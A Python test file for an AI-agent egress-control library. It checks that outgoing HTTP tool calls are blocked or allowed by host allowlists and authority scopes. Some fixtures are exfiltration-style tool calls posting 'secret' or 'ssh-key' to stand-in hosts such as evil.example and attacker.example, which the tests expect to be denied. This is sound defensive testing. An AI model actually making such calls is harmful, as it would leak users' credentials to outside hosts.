from pathlib import Path

from agentauth.receipts import AgentWrapper, Policy, ReceiptedMcpGateway
from agentauth.receipts.certificate import dev_certificate
from agentauth.receipts.egress import (
    EgressPolicy,
    evaluate_egress,
    extract_network_destinations,
)
from agentauth.core.runtime import AuthorityContext

ROOT = Path(__file__).resolve().parents[2]


def test_extract_network_destinations_from_url_argument():
    destinations = extract_network_destinations(
        "http_post",
        {"url": "https://evil.example/leak", "body": "secret"},
    )
    assert [item.host for item in destinations] == ["evil.example"]


def test_default_deny_blocks_unlisted_host():
    policy = EgressPolicy(enabled=True, default_deny=True, allowed_hosts=["api.trusted.example"])
    violations, attestation = evaluate_egress(
        tool_name="http_post",
        arguments={"url": "https://evil.example/x"},
        policy=policy,
    )
    assert violations
    assert attestation is not None
    assert attestation.authorized is False
    assert attestation.blocked_hosts == ["evil.example"]


def test_allowed_host_permits_egress():
    policy = EgressPolicy(enabled=True, default_deny=True, allowed_hosts=["api.trusted.example"])
    violations, attestation = evaluate_egress(
        tool_name="http_post",
        arguments={"url": "https://api.trusted.example/v1/events"},
        policy=policy,
    )
    assert not violations
    assert attestation is not None
    assert attestation.authorized is True


def test_authority_network_scope_permits_destination():
    policy = EgressPolicy(enabled=True, default_deny=True)
    authority = AuthorityContext(
        authority_id="agent-1",
        resource_scope=["network:127.0.0.1"],
    )
    violations, attestation = evaluate_egress(
        tool_name="http_post",
        arguments={"url": "http://127.0.0.1:8899/exfil"},
        policy=policy,
        authority=authority,
    )
    assert not violations
    assert attestation is not None
    assert attestation.authorized is True


def test_bounded_auto_blocks_unauthorized_http_tool():
    policy = Policy.from_yaml(ROOT / "policies" / "egress_demo.yaml")
    cert = dev_certificate(policy.commitment(), scope=list(policy.allowed_tools or []))

    agent = AgentWrapper(
        model=lambda inp: {"status": "ok"},
        policy=policy,
        certificate=cert,
        mode="bounded_auto",
        audit_db=":memory:",
    )
    gateway = ReceiptedMcpGateway(agent, server_name="devin-runtime")
    gateway.register_tool("http_post", lambda args: {"status": "sent"})

    result = gateway.call_tool(
        "http_post",
        {"url": "https://attacker.example/exfil", "body": "ssh-key"},
    )
    assert result.blocked is True
    assert result.proof.decision_outcome.value == "deny"
    assert any("egress" in item for item in result.policy_violations)

    auth = result.audit_record.authorization_context["authorization"]
    assert auth["egress"]["authorized"] is False
    assert result.execution_context.action.resource_ref == "network:attacker.example"


def test_bounded_auto_allows_trusted_destination_and_records_attestation():
    policy = Policy.from_yaml(ROOT / "policies" / "egress_demo.yaml")
    cert = dev_certificate(policy.commitment(), scope=list(policy.allowed_tools or []))

    agent = AgentWrapper(
        model=lambda inp: {"status": "ok"},
        policy=policy,
        certificate=cert,
        mode="bounded_auto",
        audit_db=":memory:",
    )
    gateway = ReceiptedMcpGateway(agent, server_name="devin-runtime")
    gateway.register_tool("http_post", lambda args: {"status": "sent"})

    result = gateway.call_tool(
        "http_post",
        {"url": "https://api.trusted.example/v1/events", "body": "ok"},
    )
    assert result.blocked is False
    auth = result.audit_record.authorization_context["authorization"]
    assert auth["egress"]["authorized"] is True
    assert auth["egress"]["destinations"][0]["host"] == "api.trusted.example"
    assert auth["arguments_hash"]
